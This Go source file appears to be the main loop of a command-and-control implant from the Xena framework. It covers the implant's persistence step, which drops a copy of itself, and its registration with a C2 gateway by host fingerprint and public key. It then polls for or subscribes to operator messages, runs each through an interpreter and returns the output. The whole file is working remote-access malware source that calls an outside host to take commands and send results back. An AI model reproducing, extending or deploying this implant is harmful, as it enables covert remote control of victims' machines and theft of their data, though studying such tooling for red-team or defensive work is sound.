package main

import (
	"agent/config"
	"agent/interpreter"
	"common/debug"
	"common/slices"
	"crypto/md5"
	"encoding/hex"
	"math/rand"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/shirou/gopsutil/v3/cpu"
	c2api "github.com/zarkones/xena-client"
	cry "github.com/zarkones/xena-crypto"
)

func main() {
	debug.Println("agent has started")

	if err := initialize(); err != nil {
		debug.Println("main.initialize():", err)
		os.Exit(1)
	}

	debug.Println("initialized")

	if err := config.Patch(); err != nil {
		debug.Println("failed to patch config variables:", err)
		os.Exit(1)
	}

	debug.Println("variables patched")

	if err := dropSelf(); err != nil {
		debug.Println("Failed to persist...", err)
	}

	c2api.Init(&config.GatewayHost, config.TrustedPubKey, time.Minute*5)

	debug.Println("HTTP client initialized", config.GatewayHost)

	rawAgentID, err := os.ReadFile(config.PathToAgentID)
	if err == nil {
		config.AgentID = string(rawAgentID)
	}

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "_unknown"
	}

	for range time.Tick(time.Second * time.Duration(rand.Intn(config.MaxLoopWait-config.MinLoopWait)+config.MaxLoopWait)) {
		debug.Println("main loop tick")

		if config.AgentID == "" {
			agentPubKeyPEM, err := cry.PubKeyToPEM(&config.PrivateKey.PublicKey)
			if err != nil {
				debug.Println("main: cry.PubKeyToPEM():", err)
				continue
			}
			id, err := c2api.Identify(hostname, runtime.GOOS, runtime.GOARCH, agentPubKeyPEM, config.PrivateKey)
			if err != nil {
				debug.Println("failed to identify to the c2:", err)
				continue
			}
			config.AgentID = id
			// We do not handle the error of os.WriteFile as I have no idea what to do about it.
			os.WriteFile(config.PathToAgentID, []byte(config.AgentID), 0777)
		}

		if !config.PubSubEnabled {
			messages, err := c2api.AgentFetchMessages(config.AgentID, config.PrivateKey)
			if err != nil {
				debug.Println("failed to fetch new messages from the c2:", err)
				continue
			}

			for _, msg := range messages {
				output := interpreter.Interpret(msg.Request)

				if output == "" {
					output = "_EMPTY_RESPONSE"
				}

				if err := c2api.AgentRespondToMessage(msg.ID, msg.PipelineExecutionID, output); err != nil {
					debug.Println("failed to respond to a message:", err)
					continue
				}
			}
		}

		// The reason we're repeating the pubsub check is;
		// In the previous fetching of messages the pubsub might have gotten enabled.
		// Instead of letting the main loop do the sleep,
		// we check if we should initiate real-time communication.
		if config.PubSubEnabled {
			if err := c2api.AgentMessagesSubscribe(
				config.AgentID,

				config.PrivateKey,

				func(msg c2api.Message) {
					output := interpreter.Interpret(msg.Request)

					if output == "" {
						output = "_EMPTY_RESPONSE"
					}

					if err := c2api.AgentRespondToMessage(msg.ID, msg.PipelineExecutionID, output); err != nil {
						debug.Println("failed to respond to a message:", err)
						return
					}
				},

				func(messageBuffer string, err error) {
					// TODO: Handle the errored buffer.
					debug.Println("ERR MSG BUFF:", err, messageBuffer)
				},

				func() (exit bool) {
					return !config.PubSubEnabled
				},
			); err != nil {
				debug.Println("PubSub failed with error:", err)
			}
		}
	}
}

func initialize() (err error) {
	hostname, _ := os.Hostname()
	cpus := []string{}
	i, _ := cpu.Info()
	for _, cpu := range i {
		cpus = append(cpus, cpu.ModelName)
	}
	cpus = slices.Deduplicate(cpus)

	hash := md5.Sum([]byte(
		hostname +
			runtime.GOOS +
			runtime.GOARCH +
			strings.Join(cpus, ""),
	))
	config.PathToAgentID = hex.EncodeToString(hash[:])

	hash = md5.Sum([]byte(
		"privKey" +
			hostname +
			runtime.GOOS +
			runtime.GOARCH +
			strings.Join(cpus, ""),
	))
	config.PathToPrivKey = hex.EncodeToString(hash[:])

	if err := config.InitKeys(config.PathToPrivKey); err != nil {
		return err
	}

	return nil
}
